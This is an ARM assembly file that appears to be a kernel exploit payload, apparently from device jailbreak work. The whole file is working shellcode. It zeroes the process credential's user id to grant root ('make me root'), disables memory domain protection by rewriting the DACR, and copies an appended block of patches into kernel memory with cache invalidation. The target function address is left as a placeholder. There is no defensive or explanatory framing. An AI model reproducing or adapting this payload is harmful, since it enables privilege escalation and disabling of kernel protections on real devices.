.syntax unified
.globl start
start:
    # make me root
    mov r12, lr
    ldr r3, proc_ucred
    blx r3
    mov r1, #0
    str r1, [r0, #0xc]

    # fix the DACR
    mov r0, #1
    mcr p15, 0, r0, c3, c0, 0

    adr r0, weirdfile
pf_loop:
    ldr r3, [r0], #4 ;# addr
    cmp r3, #0
    beq pf_done

    ldr r1, [r0], #4 ;# datalen

    add r2, r3, r1
copy_loop:
    ldrb lr, [r0], #1
    strb lr, [r3], #1
    cmp r3, r2
    bne copy_loop
    
    sub r3, r1
inval_loop:
    # no, this is not wrong
    mcr p15, 0, r3, c7, c11, 1
    mcr p15, 0, r3, c7, c5, 1
    cmp r3, r2
    add r3, #16
    bls inval_loop

    b pf_loop

pf_done:
    mcr p15, 0, r0, c7, c5, 6 

    mov r0, #0
    bx r12

.align 2
proc_ucred: .long 0xdeadbeef
weirdfile:
